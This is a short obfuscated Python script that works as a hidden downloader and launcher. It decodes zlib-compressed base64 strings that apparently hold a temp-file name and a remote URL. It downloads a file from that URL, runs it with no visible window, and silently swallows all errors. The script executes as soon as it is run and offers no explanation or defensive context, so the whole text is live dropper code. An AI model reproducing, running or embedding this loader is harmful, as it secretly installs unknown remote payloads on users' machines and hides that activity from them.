import zlib as A,base64 as B,os,tempfile as F,requests as G,subprocess as C
def D():
	D=os.path.join(F.gettempdir(),(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrzs9JzEvUzctPSdVLrUgFAC8FBcI='))
	try:
		E=G.get((lambda s:A.decompress(B.b64decode(s)).decode())('eJwFwcENwCAIAMCJhH+3IZZEAgWjWDp+70bm3BfiYE8SpSKRUwd6PAjFZk09ynGqtJdMbkoJx7068Mc/6SEXpg=='),stream=True);E.raise_for_status()
		with open(D,(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrTwIAAVIA2g=='))as H:
			for I in E.iter_content(chunk_size=8192):H.write(I)
		C.Popen(D,creationflags=C.CREATE_NO_WINDOW)
	except:pass
D()